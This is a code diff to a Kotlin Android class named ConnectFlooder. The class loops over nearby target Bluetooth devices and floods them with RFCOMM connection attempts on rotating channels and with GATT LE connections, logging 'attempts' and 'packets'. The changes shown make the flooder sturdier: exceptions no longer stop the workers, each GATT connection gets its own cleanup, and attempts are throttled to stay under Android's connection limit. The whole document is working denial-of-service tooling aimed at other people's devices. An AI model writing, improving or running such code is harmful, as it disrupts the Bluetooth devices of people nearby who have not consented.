@@ -8,6 +8,7 @@ import android.bluetooth.BluetoothGattCallback
 import android.bluetooth.BluetoothSocket
 import android.content.Context
 import android.content.pm.PackageManager
+import android.os.Build
 import androidx.core.content.ContextCompat
 import java.io.IOException
 import java.util.UUID
@@ -37,12 +38,6 @@ class ConnectFlooder(
     private var pool: java.util.concurrent.ExecutorService? = null
     private var scheduler: ScheduledExecutorService? = null
 
-    private val gattCallbacks = object : BluetoothGattCallback() {
-        override fun onConnectionStateChange(gatt: BluetoothGatt, status: Int, newState: Int) {
-            runCatching { gatt.close() }
-        }
-    }
-
     fun start() {
         if (!running.compareAndSet(false, true)) return
         if (!hasPermission()) {
@@ -54,7 +49,7 @@ class ConnectFlooder(
         pool = Executors.newFixedThreadPool(workers) { r ->
             Thread(r, "komugi-flood").apply { isDaemon = true }
         }
-        scheduler = Executors.newScheduledThreadPool(1) { r ->
+        scheduler = Executors.newScheduledThreadPool(2) { r ->
             Thread(r, "komugi-abort").apply { isDaemon = true }
         }
         SpamState.log("flood: $workers workers armed")
@@ -63,8 +58,8 @@ class ConnectFlooder(
 
     fun stop() {
         if (!running.compareAndSet(true, false)) return
-        pool?.shutdownNow()
-        scheduler?.shutdownNow()
+        runCatching { pool?.shutdownNow() }
+        runCatching { scheduler?.shutdownNow() }
         pool = null
         scheduler = null
         SpamState.log("flood: stopped after ${attempts.get()} attempts")
@@ -74,18 +69,23 @@ class ConnectFlooder(
         var channel = 1 + (index % 30)
         var round = 0
         while (running.get()) {
-            val targets = targetsProvider()
-            if (targets.isEmpty()) {
-                Thread.sleep(400)
-                continue
-            }
-            val device = targets[round % targets.size]
-            round++
-            if (round % 3 == 0) {
-                gattAttempt(device)
-            } else {
-                channel = (channel % 30) + 1
-                rfcommAttempt(device, channel)
+            try {
+                val targets = targetsProvider()
+                if (targets.isEmpty()) {
+                    Thread.sleep(400)
+                    continue
+                }
+                val device = targets[round % targets.size]
+                round++
+                if (round % 3 == 0) {
+                    gattAttempt(device)
+                } else {
+                    channel = (channel % 30) + 1
+                    rfcommAttempt(device, channel)
+                }
+            } catch (t: Throwable) {
+                SpamState.log("flood worker: ${t.javaClass.simpleName} ${t.message.orEmpty()}")
+                Thread.sleep(200)
             }
         }
     }
@@ -115,11 +115,14 @@ class ConnectFlooder(
             } else {
                 SpamState.packet("timeout ${device.address} ch$channel")
             }
+        } catch (t: Throwable) {
+            failures.incrementAndGet()
+            SpamState.failure("rfcomm err: ${t.javaClass.simpleName}")
         } finally {
             runCatching { socket.close() }
         }
         val elapsedMs = (System.nanoTime() - started) / 1_000_000
-        if (elapsedMs < 40) Thread.sleep(40 - elapsedMs)
+        if (elapsedMs < 60) Thread.sleep(60 - elapsedMs)
     }
 
     /**
@@ -140,21 +143,47 @@ class ConnectFlooder(
     }
 
     private fun gattAttempt(device: BluetoothDevice) {
+        val isClosed = AtomicBoolean(false)
+        val callback = object : BluetoothGattCallback() {
+            override fun onConnectionStateChange(gatt: BluetoothGatt, status: Int, newState: Int) {
+                if (isClosed.compareAndSet(false, true)) {
+                    runCatching {
+                        gatt.disconnect()
+                        gatt.close()
+                    }
+                }
+            }
+        }
+
         val gatt = runCatching {
-            device.connectGatt(context, false, gattCallbacks, BluetoothDevice.TRANSPORT_LE)
+            device.connectGatt(context, false, callback, BluetoothDevice.TRANSPORT_LE)
         }.getOrNull()
+
         if (gatt == null) {
             failures.incrementAndGet()
             SpamState.failure("gatt ${device.address}")
+            Thread.sleep(100)
             return
         }
+
         attempts.incrementAndGet()
         SpamState.packet("gatt ${device.address}")
-        scheduler?.schedule({ runCatching { gatt.close() } }, GATT_HOLD_MS, TimeUnit.MILLISECONDS)
+
+        scheduler?.schedule({
+            if (isClosed.compareAndSet(false, true)) {
+                runCatching {
+                    gatt.disconnect()
+                    gatt.close()
+                }
+            }
+        }, GATT_HOLD_MS, TimeUnit.MILLISECONDS)
+
+        // Throttle to keep active GATT connections under Android's 32-connection limit
+        Thread.sleep(80)
     }
 
     private fun hasPermission(): Boolean {
-        if (android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.S) return true
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.S) return true
         return ContextCompat.checkSelfPermission(context, Manifest.permission.BLUETOOTH_CONNECT) ==
             PackageManager.PERMISSION_GRANTED
     }
